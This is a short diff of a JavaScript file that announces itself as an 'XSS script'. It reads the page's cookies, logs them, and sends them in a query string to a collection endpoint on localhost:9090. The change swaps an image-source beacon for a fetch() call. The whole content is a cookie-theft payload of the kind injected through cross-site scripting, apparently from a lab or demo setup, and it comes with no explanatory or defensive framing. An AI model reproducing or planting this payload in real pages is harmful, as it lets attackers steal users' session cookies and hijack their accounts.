@@ -1,10 +1,16 @@
 
 
+console.log('XSS script running...');
+
 var cookies = document.cookie;
 
-var logo = document.getElementById("logo");
+console.log(cookies);
 
-logo.src = 'http://localhost:9090/img/xss?userCookies=' + cookies;
+var logo = document.getElementById('logo');
+
+fetch('https://localhost:9090/img/xss?userCookies=' + cookies);
+
+
 
 
 
